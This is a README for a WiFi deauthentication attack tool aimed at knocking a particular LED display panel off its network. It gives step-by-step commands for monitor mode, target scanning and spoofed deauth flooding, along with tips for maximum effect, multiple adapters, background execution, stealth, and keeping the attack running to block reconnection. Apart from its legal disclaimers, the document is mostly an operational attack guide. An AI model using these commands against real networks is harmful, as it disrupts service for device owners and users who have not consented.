# WiFi Deauthentication Attack Tool - Kali Linux Edition

## ⚠️ WARNING
**This tool is for educational purposes and authorized security testing only.**
- Unauthorized use of this tool is **ILLEGAL** in most jurisdictions
- Only use on networks you own or have explicit written permission to test
- Misuse can result in criminal charges and civil liability

## Overview
This tool performs WiFi deauthentication attacks using a WiFi adapter in monitor mode. Optimized for **Kali Linux** with pre-installed tools like aircrack-ng and scapy.

### ⚡ POWERFUL VERSION AVAILABLE!
If the regular attack isn't working, use **`power_deauth.py`** - a much more aggressive version with:
- Multiple parallel threads
- Ultra-fast packet sending (1000+ packets/second)
- INSTANT KILL mode for immediate effect
- See `POWER_ATTACK_GUIDE.md` for details

## Prerequisites

### Hardware
- **LEO X SYS WiFi Adapter** (or any adapter supporting monitor mode)
- USB port for the adapter

### Software (Kali Linux)
- **Kali Linux** (latest version recommended)
- Python 3.7 or higher (pre-installed on Kali)
- Root/sudo privileges

### Pre-installed Tools on Kali
Kali Linux comes with most tools pre-installed:
- ✅ `aircrack-ng` suite (airmon-ng, airodump-ng, etc.)
- ✅ `scapy` (Python library)
- ✅ `iwconfig`, `iw`, `ip` (network tools)
- ✅ `wireless-tools`

## Installation

### Quick Setup (Kali Linux)

```bash
# Clone or download this repository
cd LED_PANEL

# Install Python dependencies (if not already installed)
sudo pip3 install scapy

# Or use requirements.txt
pip3 install -r requirements.txt

# Make scripts executable
chmod +x deauth_attack.py find_led_panel.py setup_kali.sh
```

### Verify Installation

```bash
# Check if aircrack-ng is installed
airmon-ng --version

# Check if scapy is installed
python3 -c "import scapy; print('Scapy OK')"

# Check Python version
python3 --version
```

## Usage

### Step 1: Identify Your WiFi Interface

```bash
# Method 1: Using iwconfig
iwconfig

# Method 2: Using ip
ip link show

# Method 3: Using airmon-ng
sudo airmon-ng
```

Look for your adapter (usually `wlan0`, `wlan1`, etc.)

### Step 2: Enable Monitor Mode

**Recommended Method (using aircrack-ng):**

```bash
# Kill interfering processes first
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0
```

This creates a new interface (usually `wlan0mon` or `wlan1mon`).

**Alternative Method (using the script):**

```bash
sudo python3 deauth_attack.py --monitor -i wlan0
```

**Manual Method:**

```bash
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Step 3: Scan for Networks

```bash
# Using the built-in scanner
sudo python3 deauth_attack.py --scan -i wlan0mon

# Or use the dedicated scanner
sudo python3 find_led_panel.py wlan0mon 30
```

This will show all available WiFi networks. Look for:
- Networks with "LED", "Panel", "Display", "Climate", "Change" in the name
- Networks with strong signal strength
- Networks that appear when the LED panel is on

**Note the BSSID (MAC address)** of your LED panel.

### Step 4: Perform Deauthentication Attack

#### Option A: Disconnect All Clients (Broadcast) - Recommended
```bash
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF
```
Replace `AA:BB:CC:DD:EE:FF` with your LED panel's BSSID.

#### Option B: Disconnect Specific Client
```bash
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66
```

#### Option C: Send Limited Packets
```bash
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF -n 100
```

#### Option D: Custom Interval (slower attack)
```bash
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF --interval 0.5
```

#### Option E: Faster Attack (more aggressive)
```bash
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF --interval 0.01
```

### Step 5: Stop the Attack
Press `Ctrl+C` to stop the attack.

### Step 6: Restore Managed Mode (After Attack)

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Or manually
sudo ifconfig wlan0mon down
sudo iwconfig wlan0mon mode managed
sudo ifconfig wlan0 up

# Restart network manager
sudo systemctl restart NetworkManager
```

## Command Line Options

```
-i, --interface    Network interface (e.g., wlan0mon) [REQUIRED]
-t, --target       Target AP MAC address (BSSID) [REQUIRED for attack]
-c, --client       Client MAC address (optional, for targeted attack)
-n, --count        Number of packets to send (0 = infinite, default: 0)
--interval         Time between packets in seconds (default: 0.1)
--scan             Scan for available networks
--monitor          Attempt to set interface to monitor mode automatically
```

## How It Works

1. **Monitor Mode**: The WiFi adapter captures all packets on a channel without connecting to any network
2. **Deauthentication Frames**: The script sends 802.11 deauthentication frames
3. **Spoofing**: Frames are spoofed to appear as if they come from the access point or client
4. **Disconnection**: The target device receives the deauth frame and disconnects

## Troubleshooting

### "No such device" or "Interface not found"
```bash
# Check available interfaces
iwconfig
ip link show

# Verify adapter is plugged in
lsusb | grep -i wifi

# Try different interface names
sudo python3 deauth_attack.py --scan -i wlan1mon
```

### "Operation not permitted"
- Always run with `sudo` on Kali Linux
- Check if interface is already in use: `sudo airmon-ng check`

### Monitor mode not working
```bash
# Check if adapter supports monitor mode
sudo iw list | grep -A 5 "Supported interface modes"

# Kill interfering processes
sudo airmon-ng check kill

# Try different method
sudo ifconfig wlan0 down
sudo iw dev wlan0 set type monitor
sudo ifconfig wlan0 up
```

### No networks found during scan
```bash
# Ensure you're in monitor mode
iwconfig | grep Mode

# Should show "Mode:Monitor"

# Try scanning longer
sudo python3 find_led_panel.py wlan0mon 60

# Check if adapter is working
sudo iwconfig wlan0mon
```

### "airmon-ng: command not found"
```bash
# Install aircrack-ng
sudo apt-get update
sudo apt-get install aircrack-ng
```

### Adapter not detected
```bash
# Check USB devices
lsusb

# Check kernel modules
lsmod | grep -i wifi

# Load driver if needed
sudo modprobe <driver_name>
```

## Kali Linux Specific Tips

### Using Multiple Adapters
You can use multiple WiFi adapters for stronger attacks:
```bash
# Enable monitor mode on both
sudo airmon-ng start wlan0  # Creates wlan0mon
sudo airmon-ng start wlan1  # Creates wlan1mon

# Run attacks on both (in separate terminals)
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID> &
sudo python3 deauth_attack.py -i wlan1mon -t <BSSID> &
```

### Channel Hopping
If the LED panel is on a specific channel:
```bash
# Set interface to specific channel
sudo iwconfig wlan0mon channel <channel_number>

# Then run attack
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID>
```

### Background Execution
Run attack in background:
```bash
# Run in background
sudo nohup python3 deauth_attack.py -i wlan0mon -t <BSSID> > /dev/null 2>&1 &

# Check if running
ps aux | grep deauth_attack

# Stop background process
sudo pkill -f deauth_attack.py
```

## Legal and Ethical Considerations

### ✅ Legal Uses:
- Testing your own networks
- Authorized penetration testing
- Security research with permission
- Educational purposes in controlled environments

### ❌ Illegal Uses:
- Disrupting networks you don't own
- Interfering with public WiFi
- Causing service disruption
- Unauthorized access attempts

## Alternative Solutions

If you want to properly manage your LED panel:

1. **Access Panel Settings**: Connect to the panel's WiFi and access its web interface
2. **Change WiFi Settings**: Disable or reconfigure the WiFi broadcast
3. **Physical Access**: Check for reset buttons or configuration ports
4. **Manufacturer Support**: Contact the LED panel manufacturer for assistance

## Performance Optimization

### For Maximum Effectiveness:
- Use interval of 0.01-0.05 seconds for faster attacks
- Position adapter closer to LED panel
- Use high-gain antennas if available
- Run multiple instances on different channels

### For Stealth:
- Use longer intervals (0.5-1.0 seconds)
- Send limited packets (-n option)
- Use targeted attacks instead of broadcast

## Notes

- The attack will continue until you press `Ctrl+C`
- Effectiveness depends on signal strength and distance
- Some modern devices have protection against deauth attacks (WPA3)
- The LED panel may automatically reconnect after the attack stops
- Keep the attack running continuously to prevent reconnection

## Complete Workflow Example

```bash
# 1. Check interfaces
iwconfig

# 2. Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 3. Scan for LED panel
sudo python3 find_led_panel.py wlan0mon 30

# 4. Launch attack (replace BSSID with actual)
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF

# 5. Stop attack (Ctrl+C)

# 6. Restore managed mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

## Disclaimer

The authors and contributors are not responsible for any misuse of this tool. Use at your own risk and ensure you have proper authorization before testing on any network.
